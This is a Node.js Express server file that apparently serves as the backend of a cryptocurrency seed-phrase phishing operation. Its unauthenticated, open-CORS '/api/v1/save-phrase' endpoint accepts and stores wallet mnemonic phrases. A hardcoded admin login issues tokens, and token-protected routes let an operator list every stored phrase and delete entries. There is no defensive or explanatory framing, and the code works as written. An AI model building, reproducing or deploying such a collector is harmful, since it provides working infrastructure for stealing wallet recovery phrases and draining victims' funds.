const express = require("express");
require("dotenv").config();
const cors = require("cors");
const cookieParser = require("cookie-parser");
const mongoose = require("mongoose");
const jwt = require("jsonwebtoken");
const User = require("./model/users");
const validateCookie = require("./middleware/validateCookie");
const ValidateToken = require("./middleware/validateToken");

const app = express();

app.use(express.json());
app.use(cors());
app.use(cookieParser());

const env = process.env;

mongoose
  .connect(env.DATABASE_URL, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log("Database connected");
  })
  .catch((err) => {
    console.error(err);
  });

app.get("/", validateCookie, (req, res) => {
  return res.status(200).json({
    status: "success",
    message: "welcome to the api",
  });
});

app.get("/api/v1/get-all-entry", ValidateToken, async (req, res) => {
  try {
    const data = await User.find();

    return res.status(200).json({
      status: "success",
      message: "Data fetched successfully.",
      data: data || [],
    });
  } catch (error) {
    return res.json({ status: "error", message: error.message });
  }
});

app.post("/api/v1/save-phrase", async (req, res) => {
    
  const { mnemonic_phrase, user_id } = req.body;
  if (!mnemonic_phrase || !user_id) {
    return res.json({
      message: "mnemonic_phrase and user_id are required.",
    });
  }

  try {

    const user = await User.create(req.body);

    return res.status(201).json({
      message: "User entry created",
      user,
    });
  } catch (error) {
    return res.json({ status: "error", message: error.message });
  }
});

app.post("/api/v1/admin-login", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({
      status: "error",
      message: "password and email are required.",
    });
  }

  try {
    if (email !== env.ADMIN_EMAIL || password !== env.ADMIN_PASSWORD) {
      return res.status(401).json({
        status: "error",
        message: "incorrect credentials.",
      });
    }

    const token = jwt.sign({ payload: env.PAYLOAD }, env.SECRET_KEY, {
      expiresIn: "1d",
    });

    return res.status(200).json({
      status: "success",
      message: "Admin signed in successfully.",
      token,
    });
  } catch (error) {
    return res.json({ status: "error", message: error.message });
  }
});

app.delete(
  "/api/v1/delete-a-user-entry/:entry_id",
  ValidateToken,
  async (req, res) => {
    const { entry_id } = req.params;

    if (!entry_id) {
      return res.status(400).json({
        status: "error",
        message: "entry id is required.",
      });
    }

    try {
      const entry = await User.findByIdAndDelete(entry_id);

      if(!entry) {
        return res.status(404).json({
            status: "error",
            message: "Entry does not exist.",
          }); 
      }

      return res.status(200).json({
        status: "success",
        message: "User entry deleted successfully.",
      });
    } catch (error) {
      return res.json({ status: "error", message: error.message });
    }
  }
);

app.use("*", (req, res) => {
  return res.status(404).json({
    status: "error",
    message: "You seem lost, route does not exist.",
  });
});

module.exports = app;
